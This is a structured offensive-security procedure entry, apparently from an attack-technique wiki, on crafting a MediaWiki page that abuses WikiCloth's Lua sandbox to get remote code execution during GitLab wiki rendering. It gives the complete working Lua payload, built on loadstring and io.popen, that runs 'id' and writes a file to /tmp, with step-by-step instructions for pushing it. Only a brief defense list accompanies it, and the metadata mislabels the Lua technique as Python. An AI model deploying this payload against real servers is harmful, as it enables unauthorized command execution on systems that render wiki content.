---
id: proc-create-payload-file
tags:
  - lua
  - payload
  - sandbox-bypass
type: procedure
tools:
  - '[[tools/WikiCloth]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/execute-id]]'
  - '[[commands/execute-echo-file]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
updated_at: '2025-12-14T17:23:50.169Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
---
# Create-Malicious-Wiki-Payload-File

## Summary

This procedure crafts a MediaWiki page file embedding Lua code that bypasses WikiCloth's insecure sandbox to execute arbitrary system commands via io.popen.

## Description

The payload uses <lua> tags to invoke Lua processing. It employs pcall to load a string defining an 'execute' function in the global environment, bypassing loadstring's sandbox. Commands like 'id' and 'echo vakzz > /tmp/ggg' demonstrate RCE. This targets GitLab's wiki rendering; prerequisites: Cloned wiki repo; outcomes: File ready for push, leading to command execution on render.

## Requirements

1. Local text editor for .wiki file creation
2. Knowledge of Lua sandbox bypass techniques from Lua users wiki
3. Cloned wiki repository

## Defense

Defensive measures and detection strategies:

- Sanitize wiki content for <lua> tags before rendering
- Implement strict Lua environment isolation (e.g., Lua 5.2+ sandboxes)
- Scan commits for suspicious Lua code patterns

## Objectives

1. Embed bypass code to access io.popen
2. Demonstrate RCE with command execution and file write
3. Ensure payload triggers on wiki view

## Instructions

### Step 1: Write Lua Payload

**Context**: Create hello.wiki with sandbox bypass code.

**Command** (File Creation):
Create file with content:
```lua
<lua>
local old_print = print
pcall(function() loadstring("function execute(cmd) local handle = io.popen(cmd); local result = handle:read('*a'); handle:close(); return result end")() end)
print(execute('id'))
print(execute('echo vakzz > /tmp/ggg'))
</lua>
```

> Uses pcall to evade sandbox. Expected output: File saved; test locally if possible.

### Step 2: Integrate Commands

**Context**: Embed specific RCE demos using the execute function.

**Command** ([[commands/execute-id]]):
Include in payload: print(execute('id'))

> Runs 'id' via io.popen. Expected output on render: User ID info.

**Command** ([[commands/execute-echo-file]]):
Include: print(execute('echo vakzz > /tmp/ggg'))

> Writes file. Expected output on render: No visible output, but file created.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Python]] Lua

### Sub-Techniques


## Commands Used

- [[commands/execute-id]]
- [[commands/execute-echo-file]]

## Tools Used

- [[tools/WikiCloth]]

## Tags

- lua
- payload
- sandbox-bypass
